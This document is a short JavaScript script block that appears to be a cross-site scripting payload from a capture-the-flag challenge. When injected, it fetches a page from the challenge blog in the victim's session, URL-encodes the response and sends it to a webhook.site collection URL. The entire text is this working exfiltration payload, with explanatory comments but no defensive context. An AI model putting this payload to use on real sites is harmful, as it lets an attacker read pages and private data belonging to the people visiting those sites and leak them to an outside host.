<script>
  // Fetch data from the specified URL
  fetch('https://blogger.challenge.alphabit.club/post/kz4ce5')
    .then(response => {
      // Check if the response is OK (status code 200)
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      // Extract the response body as text
      return response.text(); 
    })
    .then(data => {
      // Process the fetched data

      // Encode the fetched data
      var encodedData = encodeURIComponent(data);

      // Construct the URL with the encoded data as query parameters
      var url = 'https://webhook.site/bb386631-e823-41b9-863d-a799026e1a6e?data=' + encodedData;

      // Make a GET request to your server with the constructed URL
      fetch(url)
        .then(response => {
          // Check if the response is OK (status code 200)
          if (!response.ok) {
            throw new Error('Network response was not ok');
          }
          // Data sent successfully
          console.log('Data sent to server successfully');
        })
        .catch(error => {
          // Handle any errors that occur during the fetch operation
          console.error('There was a problem with the fetch operation:', error);
        });
    })
    .catch(error => {
      // Handle any errors that occur during the fetch operation
      console.error('There was a problem with the fetch operation:', error);
    });
</script>

